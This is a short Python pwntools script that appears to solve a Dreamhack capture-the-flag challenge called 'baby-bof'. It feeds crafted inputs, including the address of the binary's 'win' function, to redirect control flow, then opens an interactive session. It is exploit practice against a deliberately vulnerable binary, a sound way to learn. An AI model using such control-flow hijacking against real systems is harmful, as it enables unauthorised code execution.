#!/usr/bin/env python3

from pwn import *

exe = ELF("./baby-bof", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
    if args.DEBUG:
        gdb.attach(p)
else:
    p = remote("host1.dreamhack.games", 22529)

input()

p.sendlineafter(b'name: ', b'abcdxyz')
p.sendlineafter(b'value: ', hex(exe.sym['win']))
p.sendlineafter(b'count: ', str(4))

p.interactive()